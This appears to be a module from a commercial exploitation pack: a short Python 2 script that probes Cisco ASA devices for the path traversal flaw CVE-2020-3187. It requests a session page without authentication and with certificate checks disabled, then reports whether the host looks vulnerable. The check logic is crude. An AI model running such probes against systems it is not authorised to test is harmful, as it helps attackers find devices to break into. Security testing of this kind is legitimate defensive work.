#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_cisco_7'
_vendor_ = 'cisco'
_model_  = ['ASA']
_vuln_   = 'Path Traversal Vulnerability'
_cve_    = 'CVE-2020-3187'
_ref_    = 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43'
_port_   = 443

def pwnrouter(host,port=_port_):
  try:
    url = "https://%s:%s/+CSCOE+/session_password.html" % (host,port)
    response = requests.get(url, verify=False)
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if (response.status_code == 200) and ('webvpn' in response.headers):
    print '[+] %s vulnerable' % host
  else:         
    print '[+] %s not vulnerable' % host

if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
